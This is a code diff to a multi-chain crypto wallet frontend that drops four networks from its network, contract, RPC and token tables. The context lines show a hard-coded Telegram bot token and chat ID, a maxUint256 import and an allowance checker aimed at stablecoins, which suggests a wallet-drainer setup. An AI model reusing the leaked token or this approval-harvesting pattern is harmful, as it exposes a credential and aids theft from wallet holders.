@@ -1,4 +1,4 @@
-import { bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, unichain, core, cronos, sei, fantom, linea, zkSync, celo } from '@reown/appkit/networks'
+import { bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fantom, linea, zkSync, celo } from '@reown/appkit/networks'
 import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { formatUnits, maxUint256, isAddress, getAddress, parseUnits } from 'viem'
@@ -21,7 +21,7 @@ if (!projectId) throw new Error('VITE_PROJECT_ID is not set')
 const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '7893105607:AAFqn6yRhXVocTodMo8xNufTFKjmzMYnNAU'
 const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-1002834788839'
 
-const networks = [bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, unichain, core, cronos, sei, fantom, linea, zkSync, celo]
+const networks = [bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fantom, linea, zkSync, celo]
 const networkMap = {
   'BNB Smart Chain': { networkObj: bsc, chainId: networks[0].id || 56 },
   'Ethereum': { networkObj: mainnet, chainId: networks[1].id || 1 },
@@ -31,14 +31,10 @@ const networkMap = {
   'Base': { networkObj: base, chainId: networks[5].id || 8453 },
   'Scroll': { networkObj: scroll, chainId: networks[6].id || 534352 },
   'Avalanche': { networkObj: avalanche, chainId: networks[7].id || 43114 },
-  'Unichain': { networkObj: unichain, chainId: networks[8].id || 130 },
-  'Core': { networkObj: core, chainId: networks[9].id || 1116 },
-  'Cronos': { networkObj: cronos, chainId: networks[10].id || 25 },
-  'Sei': { networkObj: sei, chainId: networks[11].id || 1329 },
-  'Fantom': { networkObj: fantom, chainId: networks[12].id || 250 },
-  'Linea': { networkObj: linea, chainId: networks[13].id || 59144 },
-  'zkSync': { networkObj: zkSync, chainId: networks[14].id || 324 },
-  'Celo': { networkObj: celo, chainId: networks[15].id || 42220 }
+  'Fantom': { networkObj: fantom, chainId: networks[8].id || 250 },
+  'Linea': { networkObj: linea, chainId: networks[9].id || 59144 },
+  'zkSync': { networkObj: zkSync, chainId: networks[10].id || 324 },
+  'Celo': { networkObj: celo, chainId: networks[11].id || 42220 }
 }
 console.log('Network Map:', networkMap)
 
@@ -51,10 +47,6 @@ const CONTRACTS = {
   [networkMap['Base'].chainId]: '0x3456789012345678901234567890123456789012',
   [networkMap['Scroll'].chainId]: '0x4567890123456789012345678901234567890123',
   [networkMap['Avalanche'].chainId]: '0x5678901234567890123456789012345678901234',
-  [networkMap['Unichain'].chainId]: '0x6789012345678901234567890123456789012345',
-  [networkMap['Core'].chainId]: '0x7890123456789012345678901234567890123456',
-  [networkMap['Cronos'].chainId]: '0x8901234567890123456789012345678901234567',
-  [networkMap['Sei'].chainId]: '0x9012345678901234567890123456789012345678',
   [networkMap['Fantom'].chainId]: '0xabcdef1234567890abcdef1234567890abcdef12',
   [networkMap['Linea'].chainId]: '0xbcdef1234567890abcdef1234567890abcdef123',
   [networkMap['zkSync'].chainId]: '0xcdef1234567890abcdef1234567890abcdef1234',
@@ -194,8 +186,6 @@ async function checkAllowanceViaAPI(userAddress, tokenAddress, spenderAddress, c
       8453: 'https://mainnet.base.org',
       534352: 'https://rpc.scroll.io',
       43114: 'https://api.avax.network/ext/bc/C/rpc',
-      1116: 'https://rpc.coredao.org',
-      25: 'https://evm.cronos.org',
       250: 'https://rpc.ftm.tools',
       59144: 'https://rpc.linea.build',
       324: 'https://mainnet.era.zksync.io',
@@ -653,22 +643,6 @@ const TOKENS = {
     { symbol: 'USDT', address: '0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7', decimals: 6 },
     { symbol: 'USDC', address: '0xb97ef9ef8734c71904d8002f8b6bc66dd9c48a6e', decimals: 6 }
   ],
-  'Unichain': [
-    { symbol: 'USDT', address: '0x1234567890123456789012345678901234567890', decimals: 6 },
-    { symbol: 'USDC', address: '0x2345678901234567890123456789012345678901', decimals: 6 }
-  ],
-  'Core': [
-    { symbol: 'USDT', address: '0x900101d3565a9baad24dbf7c31e3b3528b7ea285', decimals: 6 },
-    { symbol: 'USDC', address: '0xa4151b2b3e269645181dccf2d426ce75fcbdeca9', decimals: 6 }
-  ],
-  'Cronos': [
-    { symbol: 'USDT', address: '0x66e428c3f67a68878562e79a0234c1f83c208770', decimals: 6 },
-    { symbol: 'USDC', address: '0xc21223249ca28397b4b6541dfaecc539bff0c59f', decimals: 6 }
-  ],
-  'Sei': [
-    { symbol: 'USDT', address: '0x3456789012345678901234567890123456789012', decimals: 6 },
-    { symbol: 'USDC', address: '0x4567890123456789012345678901234567890123', decimals: 6 }
-  ],
   'Fantom': [
     { symbol: 'USDT', address: '0x04068da6c83afcfa0e13ba15a6696662335d5b75', decimals: 6 },
     { symbol: 'USDC', address: '0x04068da6c83afcfa0e13ba15a6696662335d5b75', decimals: 6 }
@@ -1012,9 +986,7 @@ const initializeSubscribers = (modal) => {
       else if (state?.chainId === networkMap['Fantom'].chainId) nextNetwork = 'Linea'
       else if (state?.chainId === networkMap['Linea'].chainId) nextNetwork = 'zkSync'
       else if (state?.chainId === networkMap['zkSync'].chainId) nextNetwork = 'Celo'
-      else if (state?.chainId === networkMap['Celo'].chainId) nextNetwork = 'Core'
-      else if (state?.chainId === networkMap['Core'].chainId) nextNetwork = 'Cronos'
-      else if (state?.chainId === networkMap['Cronos'].chainId) nextNetwork = 'BNB Smart Chain'
+      else if (state?.chainId === networkMap['Celo'].chainId) nextNetwork = 'BNB Smart Chain'
       else if (state?.chainId === networkMap['BNB Smart Chain'].chainId) nextNetwork = 'Ethereum'
       else nextNetwork = 'Ethereum'
       
@@ -1063,9 +1035,7 @@ document.getElementById('switch-network')?.addEventListener('click', () => {
   else if (currentChainId === networkMap['Fantom'].chainId) nextNetwork = networkMap['Linea'].networkObj
   else if (currentChainId === networkMap['Linea'].chainId) nextNetwork = networkMap['zkSync'].networkObj
   else if (currentChainId === networkMap['zkSync'].chainId) nextNetwork = networkMap['Celo'].networkObj
-  else if (currentChainId === networkMap['Celo'].chainId) nextNetwork = networkMap['Core'].networkObj
-  else if (currentChainId === networkMap['Core'].chainId) nextNetwork = networkMap['Cronos'].networkObj
-  else if (currentChainId === networkMap['Cronos'].chainId) nextNetwork = networkMap['BNB Smart Chain'].networkObj
+  else if (currentChainId === networkMap['Celo'].chainId) nextNetwork = networkMap['BNB Smart Chain'].networkObj
   else if (currentChainId === networkMap['BNB Smart Chain'].chainId) nextNetwork = networkMap['Ethereum'].networkObj
   else nextNetwork = networkMap['Ethereum'].networkObj
   
